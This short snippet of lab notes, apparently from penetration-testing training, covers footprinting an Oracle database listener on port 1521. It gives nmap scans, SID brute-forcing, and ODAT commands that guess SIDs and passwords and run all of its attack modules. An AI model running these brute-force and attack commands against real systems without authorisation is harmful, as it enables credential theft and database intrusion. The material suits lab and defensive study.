### Example 3: Footprinting & SID enumeration

Run in: **Saved lab example**.

```bash
sudo nmap -p1521 -sV <IP> --open                          # version + confirm listener
sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute # brute-force SIDs

# ODAT (Oracle Database Attacking Tool)
python3 odat.py sidguesser -s <IP> -p 1521                 # find valid SIDs
python3 odat.py passwordguesser -s <IP> -p 1521 -d XE      # brute creds for SID XE
python3 odat.py all -s <IP> -d XE -U <user> -P <pass>      # run every attack module
```
